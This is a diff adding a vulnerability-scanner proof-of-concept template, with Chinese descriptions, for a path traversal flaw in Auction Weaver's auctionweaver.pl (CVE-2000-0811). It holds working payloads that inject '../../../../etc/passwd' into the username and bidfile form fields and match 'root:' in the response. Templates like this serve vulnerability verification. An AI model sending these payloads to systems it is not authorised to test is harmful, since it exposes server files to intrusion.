@@ -1,0 +1,50 @@
+[info]
+author = "ave"
+description = "验证 Auction Weaver 1.0-1.04 路径遍历漏洞，通过 username 或 bidfile 表单字段注入 .. 序列读取服务器任意文件"
+id = "POC-AVE-2000-0959"
+name = "Auction Weaver 路径遍历任意文件读取 PoC"
+severity = "medium"
+tags = ["ave-2000-0959"]
+vuln_id = [
+    "CVE-2000-0811",
+    "AVE-2000-0959",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cgi-bin/auctionweaver.pl"
+protocol = "http"
+
+[poc.requests.body]
+content = "username=../../../../etc/passwd&password=test&action=login"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["root:"]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cgi-bin/auctionweaver.pl"
+protocol = "http"
+
+[poc.requests.body]
+content = "bidfile=../../../../etc/passwd&action=viewbid"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["root:"]
